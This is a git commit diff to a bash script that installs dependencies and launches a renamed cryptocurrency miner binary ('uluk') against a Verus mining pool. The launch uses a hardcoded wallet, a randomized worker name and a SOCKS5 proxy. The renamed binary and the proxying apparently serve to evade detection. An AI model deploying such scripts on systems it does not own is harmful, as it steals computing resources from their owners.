31336084911cf781c944eb1318a355a8b2ced460
iyazz377 <79778546+iyazz377@users.noreply.github.com>
2021-09-01 18:54:25 +0700

    Update vrsc1.sh

--- vrsc1.sh
+++ vrsc1.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x start.sh && chmod +x cumin chmod 777 cumin start.sh
+chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
+WALLET=RTEmjgEnFktDbtCLTqxof98bYN7v9syLAM
 WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
 PROXY=socks5://51.222.13.193:10084
-./uluk -a verus -o $POOL -u RTEmjgEnFktDbtCLTqxof98bYN7v9syLAM.iyazz1 -t 2 -x $PROXY
+./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
